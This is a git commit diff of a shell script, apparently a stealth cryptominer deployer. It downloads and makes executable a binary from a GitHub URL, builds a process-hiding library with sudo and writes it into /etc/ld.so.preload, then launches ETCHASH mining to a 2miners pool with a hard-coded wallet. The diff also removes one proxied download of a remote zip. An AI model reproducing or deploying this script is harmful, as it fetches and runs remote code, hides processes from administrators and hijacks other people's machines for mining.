cf3ce86f6d051b8b9fa8ecbeffc48a3868a8f273
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-11-02 20:41:57 +0700

    Update and rename trang.sh to hfyu.sh

--- hfyu.sh
+++ hfyu.sh
@@ -21,14 +21,10 @@ END
 
 wget https://github.com/angkii/m/raw/main/AkubapakMU
 chmod 700 AkubapakMU
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
 sudo make
 sudo gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 sudo mv libprocesshider.so /usr/local/lib/
 sudo echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
 POOL=etc.2miners.com:1010
 WALLET=0x11880b1cfe04907c5306222be1e09f4bbb480eb5
 ./AkubapakMU --algo ETCHASH --pool $POOL --user $WALLET $@ --no-cl
